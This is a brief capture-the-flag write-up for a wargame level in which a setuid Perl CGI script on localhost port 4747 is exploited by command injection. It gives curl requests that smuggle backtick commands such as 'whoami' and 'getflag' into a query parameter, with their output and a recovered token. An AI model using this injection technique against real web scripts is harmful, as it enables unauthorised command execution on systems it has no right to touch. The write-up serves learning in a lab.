Home contain one perl file level04.pl owned by flag04.
We can see the 2 S's in the permission field. The first s stands for the SUID and the second one stands for SGID.
When a command or script with SUID bit set is run, its effective UID becomes that of the owner of the file, rather of the user who is running it.
We see that we can pass a string as x  and the first "word" should be output by the program
We can also use the backtick notation to pass a command:
		
		./level04.pl x=`whoami`

	level04

Surprisingly the output print level04 and not flag04 as expected and explained in the Context.

We also noticed that the script indicate that it is something running on localhost:4747
nc -zv allows to check connection to 4747 without sending any data and verbose mode
		
		nc -zv localhost 4747
	
	Connection to localhost 4747 port [tcp/*] succeeded!

So trying to pass whoami command substitution reveals that is evaluate and executed now as flag04
		curl 'localhost:4747/level04.pl?x=`whoami`'
	flag04

		curl 'localhost:4747/level04.pl?x=`getflag`'
	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
